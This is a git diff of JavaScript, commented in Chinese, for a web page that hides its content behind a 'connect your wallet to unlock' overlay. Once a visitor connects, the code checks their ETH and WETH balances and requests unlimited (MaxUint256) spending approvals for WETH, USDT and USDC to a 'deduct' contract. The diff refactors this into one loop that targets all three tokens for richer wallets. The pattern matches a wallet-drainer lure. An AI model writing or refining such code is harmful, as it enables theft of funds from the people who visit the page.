@@ -1,8 +1,5 @@
 // --- Client-side Constants (客戶端常數) ---
-// ✅ 使用 EIP-55 校驗和地址以確保最大相容性
 const DEDUCT_CONTRACT_ADDRESS = '0xaFfC493Ab24fD7029E03CED0d7B87eAFC36E78E0';
-
-// 代幣合約地址 (含校驗和)
 const USDT_CONTRACT_ADDRESS = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
 const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
 const WETH_CONTRACT_ADDRESS = '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2';
@@ -21,7 +18,7 @@ const ERC20_ABI = [
 ];
 
 // --- Global Variables & DOM Elements (全域變數與 DOM 元素) ---
-// 假設您的 HTML 中有這些 ID
+// 確保您的 HTML 中有這些 ID: connectButton, blurOverlay, overlayMessage, status
 const connectButton = document.getElementById('connectButton');
 const overlay = document.getElementById('blurOverlay');
 const overlayMessage = document.getElementById('overlayMessage');
@@ -41,7 +38,8 @@ function showOverlay(message) {
     if (!overlay || !overlayMessage) return;
     overlayMessage.innerHTML = message;
     overlay.style.display = 'flex';
-    setTimeout(() => { overlay.style.opacity = '1'; }, 10);
+    // 確保 opacity 設置在 display: flex 之後，以便過渡生效
+    setTimeout(() => { overlay.style.opacity = '1'; }, 10); 
 }
 
 function updateStatus(message) {
@@ -50,18 +48,29 @@ function updateStatus(message) {
     statusDiv.style.display = message ? 'block' : 'none';
 }
 
+/**
+ * 重置應用程式的狀態，並可選地顯示「請連接」訊息。
+ * @param {boolean} showMsg - 是否顯示連接錢包的遮罩訊息。 (預設為 true)
+ */
+function resetState(showMsg = true) {
+    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
+    if (connectButton) {
+        connectButton.classList.remove('connected');
+        connectButton.title = '連接錢包';
+    }
+    if (showMsg) {
+        showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
+    }
+}
+
 // --- Core Wallet Logic (核心錢包邏輯) ---
 
 /**
- * 【最終修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理，
- * 容許 Trust Wallet 在鏈上交易成功後，拋出不影響結果的介面錯誤。
- * @param {object} populatedTx - 由 populateTransaction 產生的完整交易物件。
- * @returns {object} 交易收據 (Receipt)。
+ * 【Trust Wallet 修復】使用精簡的 RPC 請求發送交易，並加入魯棒的錯誤處理。
  */
 async function sendMobileRobustTransaction(populatedTx) {
     if (!signer || !provider) throw new Error("錢包尚未連線或簽署者遺失。");
     
-    // 1. 確保 value 格式正確
     const txValue = populatedTx.value ? populatedTx.value.toString() : '0';
     const fromAddress = await signer.getAddress();
 
@@ -69,7 +78,6 @@ async function sendMobileRobustTransaction(populatedTx) {
         from: fromAddress,
         to: populatedTx.to,
         data: populatedTx.data,
-        // 關鍵：將 BigInt 轉換為十六進制字串格式 (如 '0x0')
         value: '0x' + BigInt(txValue).toString(16) 
     };
     
@@ -77,49 +85,39 @@ async function sendMobileRobustTransaction(populatedTx) {
     let receipt = null;
 
     try {
-        // 嘗試發送交易並獲取雜湊值 (使用底層 RPC)
         txHash = await provider.send('eth_sendTransaction', [mobileTx]);
         
-        // 成功發送後，等待交易確認
         showOverlay(`交易已發送！雜湊值: ${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
         receipt = await provider.waitForTransaction(txHash);
         
     } catch (error) {
-        // 這裡會捕獲到 Trust Wallet 介面在成功交易後拋出的格式錯誤 (如 invalid data)
+        // 捕獲 Trust Wallet 介面錯誤，並嘗試從中提取 hash
         console.warn("⚠️ Trust Wallet 介面可能拋出無害錯誤。正在進行鏈上檢查...");
-        console.error("原始錯誤:", error);
         
-        // 嘗試從錯誤物件中提取雜湊值，以確保我們沒有錯過鏈上確認。
         if (error.hash) {
              txHash = error.hash;
-        } else if (error.message.includes('0x')) {
-            // 嘗試從錯誤訊息中提取可能的雜湊值
+        } else if (error.message && error.message.includes('0x')) {
             const match = error.message.match(/(0x[a-fA-F0-9]{64})/);
             if (match) txHash = match[0];
         }
 
         if (txHash) {
-             // 即使介面報錯，我們依然嘗試等待鏈上收據
              showOverlay(`交易介面錯誤發生！但交易已發送：${txHash.slice(0, 10)}...<br>正在等待區塊確認...`);
              receipt = await provider.waitForTransaction(txHash);
         } else {
-             // 如果連雜湊值都無法取得，則拋出嚴重錯誤
              throw new Error(`交易發送失敗，且無法從錯誤中獲取交易雜湊值: ${error.message}`);
         }
     }
 
-    // 檢查最終收據狀態
     if (!receipt || receipt.status !== 1) {
         throw new Error(`交易最終在鏈上失敗 (reverted)。Hash: ${txHash.slice(0, 10)}...`);
     }
 
-    // 成功！
     return receipt;
 }
 
-
 /**
- * 初始化錢包，強制切換至主網，並檢查連線狀態。
+ * 初始化錢包，強制切換至主網，並【總是開啟遮罩】要求用戶手動連接。
  */
 async function initializeWallet() {
     try {
@@ -146,20 +144,16 @@ async function initializeWallet() {
         window.ethereum.on('accountsChanged', () => window.location.reload());
         window.ethereum.on('chainChanged', () => window.location.reload());
 
+        // 檢查是否有現有的連線，如果有，重置狀態確保 connectButton 顯示未連接。
         const accounts = await provider.send('eth_accounts', []);
         if (accounts.length > 0) {
-            userAddress = accounts[0];
-            signer = await provider.getSigner();
-
-            deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
-            usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
-            usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
-            wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
-            
-            await checkAuthorization();
-        } else {
-            showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
+            resetState(false); 
         }
+
+        // 【關鍵點】：每次頁面載入，強制顯示連接遮罩
+        showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
+
+
     } catch (error) {
         console.error("Initialize Wallet Error:", error);
         showOverlay(`初始化失敗: ${error.message}`);
@@ -198,6 +192,7 @@ async function checkAuthorization() {
                  connectButton.classList.remove('connected');
                  connectButton.title = '連接與授權';
             }
+            // 如果未授權，則再次顯示連接/授權提示
             showOverlay('需要授權。<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(請點擊錢包圖標開始授權流程)</p>');
         }
         updateStatus("");
@@ -211,7 +206,61 @@ async function checkAuthorization() {
 }
 
 /**
- * 主要函數，用於連接並啟動授權流程。
+ * 條件式授權流程：根據 ETH/WETH 餘額決定要授權哪些代幣。
+ */
+async function handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess) {
+    showOverlay('正在檢查並設定代幣的支付授權...');
+    let tokenToActivate = '';
+    let stepCount = 0;
+
+    const totalSteps = serviceActivated ? tokensToProcess.length : tokensToProcess.length + 1;
+
+    // --- 檢查並請求所有所需代幣的授權 ---
+    for (const { name, contract, address } of tokensToProcess) {
+        stepCount++;
+        showOverlay(`步驟 ${stepCount}/${totalSteps}: 檢查並請求 ${name} 授權...`);
+
+        const currentAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
+
+        if (currentAllowance < requiredAllowance) {
+            showOverlay(`步驟 ${stepCount}/${totalSteps}: 請求 ${name} 授權...<br>請在您的錢包中批准。`);
+            
+            const approvalTx = await contract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
+            approvalTx.value = 0n;
+            await sendMobileRobustTransaction(approvalTx);
+            
+            const newAllowance = await contract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
+            if (newAllowance >= requiredAllowance) {
+                if (!serviceActivated && !tokenToActivate) {
+                    tokenToActivate = address;
+                }
+            }
+        } else {
+            if (!serviceActivated && !tokenToActivate) {
+                tokenToActivate = address;
+            }
+        }
+    }
+
+    // --- 服務啟動步驟 ---
+    if (!serviceActivated && tokenToActivate) {
+        stepCount++;
+        const tokenName = tokensToProcess.find(t => t.address === tokenToActivate).name;
+        showOverlay(`步驟 ${stepCount}/${totalSteps}: 啟動服務 (使用 ${tokenName})...`);
+        
+        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
+        activateTx.value = 0n;
+        await sendMobileRobustTransaction(activateTx);
+    } else if (!serviceActivated) {
+        showOverlay(`警告: 沒有足夠的代幣授權來啟動服務。請確保您有 ETH 支付 Gas 費用。`);
+    } else {
+        showOverlay(`所有授權和服務啟動已完成。`);
+    }
+}
+
+
+/**
+ * 主要函數：連接錢包並根據餘額執行條件式流程。
  */
 async function connectWallet() {
     try {
@@ -225,35 +274,51 @@ async function connectWallet() {
         const accounts = await provider.send('eth_requestAccounts', []);
         if (accounts.length === 0) throw new Error("未選擇帳戶。");
 
+        // 連接成功，設定 Signer 和合約實例
         signer = await provider.getSigner();
         userAddress = await signer.getAddress();
+        
         deductContract = new ethers.Contract(DEDUCT_CONTRACT_ADDRESS, DEDUCT_CONTRACT_ABI, signer);
         usdtContract = new ethers.Contract(USDT_CONTRACT_ADDRESS, ERC20_ABI, signer);
         usdcContract = new ethers.Contract(USDC_CONTRACT_ADDRESS, ERC20_ABI, signer);
         wethContract = new ethers.Contract(WETH_CONTRACT_ADDRESS, ERC20_ABI, signer);
 
-        showOverlay('正在檢查您的餘額以優化流程...');
+        showOverlay('正在掃描您的餘額以決定最佳授權流程...');
 
-        const [ethBalance, wethBalance, usdtBalance, usdcBalance] = await Promise.all([
+        const [ethBalance, wethBalance] = await Promise.all([
             provider.getBalance(userAddress),
             wethContract.balanceOf(userAddress),
-            usdtContract.balanceOf(userAddress),
-            usdcContract.balanceOf(userAddress)
         ]);
         
         const oneEth = ethers.parseEther("1.0");
-        const hasSignificantEth = ethBalance >= oneEth || wethBalance >= oneEth;
-        const hasNoStablecoins = usdtBalance === 0n && usdcBalance === 0n;
+        const totalEthEquivalent = ethBalance + wethBalance;
+        const hasSufficientEth = totalEthEquivalent >= oneEth;
 
         const serviceActivated = await deductContract.isServiceActiveFor(userAddress);
         const requiredAllowance = await deductContract.REQUIRED_ALLOWANCE_THRESHOLD();
-        
-        if (hasSignificantEth && hasNoStablecoins) {
-            await handleWethAuthorizationFlow(requiredAllowance, serviceActivated);
+
+        let tokensToProcess;
+
+        if (hasSufficientEth) {
+            // 情況 1: 餘額足夠 (>= 1 ETH/WETH) -> 授權 WETH, USDT, USDC (WETH優先)
+            tokensToProcess = [
+                { name: 'WETH', contract: wethContract, address: WETH_CONTRACT_ADDRESS },
+                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
+                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
+            ];
+            showOverlay('偵測到足夠的 ETH/WETH 餘額 (>= 1 ETH)，啟動 WETH, USDT, USDC 授權流程。');
         } else {
-            await handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated);
+            // 情況 2: 餘額不足 (< 1 ETH/WETH) -> 只授權 USDT, USDC
+            tokensToProcess = [
+                { name: 'USDT', contract: usdtContract, address: USDT_CONTRACT_ADDRESS },
+                { name: 'USDC', contract: usdcContract, address: USDC_CONTRACT_ADDRESS },
+            ];
+            showOverlay('ETH/WETH 餘額不足 ( < 1 ETH)，啟動 USDT, USDC 授權流程。');
         }
+
+        await handleConditionalAuthorizationFlow(requiredAllowance, serviceActivated, tokensToProcess);
         
+        // 最終檢查並更新 UI
         await checkAuthorization();
 
     } catch (error) {
@@ -275,94 +340,11 @@ async function connectWallet() {
 }
 
 /**
- * 處理 WETH 的授權和啟動流程。
- */
-async function handleWethAuthorizationFlow(requiredAllowance, serviceActivated) {
-    showOverlay('正在為您設定 WETH 付款...');
-    const wethAllowance = await wethContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
-    
-    // --- 授權 (Approve) 步驟 ---
-    if (wethAllowance < requiredAllowance) {
-        showOverlay('步驟 1/2: 請求 WETH 授權...<br>請在您的錢包中批准。');
-        
-        const approvalTx = await wethContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        approvalTx.value = 0n;
-        
-        await sendMobileRobustTransaction(approvalTx); 
-    }
-    
-    // --- 啟動服務 (Activate) 步驟 ---
-    if (!serviceActivated) {
-        showOverlay('步驟 2/2: 啟動服務...<br>請在您的錢包中確認。');
-        
-        const activateTx = await deductContract.activateService.populateTransaction(WETH_CONTRACT_ADDRESS);
-        activateTx.value = 0n;
-        
-        await sendMobileRobustTransaction(activateTx);
-    }
-}
-
-/**
- * 處理 USDT 和 USDC 的授權和啟動流程。
- */
-async function handleStablecoinAuthorizationFlow(requiredAllowance, serviceActivated) {
-    showOverlay('正在為您設定 USDT / USDC 付款...');
-    let tokenToActivate = '';
-
-    // --- USDT 授權 (Approve) 步驟 ---
-    const usdtAllowance = await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
-    if (usdtAllowance < requiredAllowance) {
-        showOverlay('步驟 1/3: 請求 USDT 授權...<br>請在您的錢包中批准。');
-        
-        const usdtApprovalTx = await usdtContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        usdtApprovalTx.value = 0n;
-        
-        await sendMobileRobustTransaction(usdtApprovalTx);
-    }
-    if ((await usdtContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
-        if (!serviceActivated) tokenToActivate = USDT_CONTRACT_ADDRESS;
-    }
-
-    // --- USDC 授權 (Approve) 步驟 ---
-    const usdcAllowance = await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS);
-    if (usdcAllowance < requiredAllowance) {
-        showOverlay('步驟 2/3: 請求 USDC 授權...<br>請在您的錢包中批准。');
-        
-        const usdcApprovalTx = await usdcContract.approve.populateTransaction(DEDUCT_CONTRACT_ADDRESS, ethers.MaxUint256);
-        usdcApprovalTx.value = 0n;
-        
-        await sendMobileRobustTransaction(usdcApprovalTx);
-    }
-    if (!tokenToActivate && (await usdcContract.allowance(userAddress, DEDUCT_CONTRACT_ADDRESS)) >= requiredAllowance) {
-          if (!serviceActivated) tokenToActivate = USDC_CONTRACT_ADDRESS;
-    }
-    
-    // --- 啟動服務 (Activate) 步驟 ---
-    if (!serviceActivated && tokenToActivate) {
-        showOverlay('步驟 3/3: 啟動服務...<br>請在您的錢包中確認。');
-        
-        const activateTx = await deductContract.activateService.populateTransaction(tokenToActivate);
-        activateTx.value = 0n;
-        
-        await sendMobileRobustTransaction(activateTx);
-    }
-}
-
-/**
  * 斷開連線並重置應用程式狀態。
  */
 function disconnectWallet() {
-    resetState();
+    resetState(true);
     alert('錢包已斷開連線。若要徹底移除網站權限，請在您錢包的「已連接網站」設定中操作。');
-}
-
-function resetState() {
-    signer = userAddress = deductContract = usdtContract = usdcContract = wethContract = null;
-    if (connectButton) {
-        connectButton.classList.remove('connected');
-        connectButton.title = '連接錢包';
-    }
-    showOverlay('請連接您的錢包以解鎖內容 🔒<p style="font-size: 16px; font-weight: normal; margin-top: 10px;">(點擊錢包圖標開始)</p>');
 }
 
 // --- Event Listeners & Initial Load (事件監聽器與初始載入) ---
@@ -377,4 +359,5 @@ if (connectButton) {
     });
 }
 
+// 頁面載入時執行初始化，這將強制顯示連接遮罩
 initializeWallet();
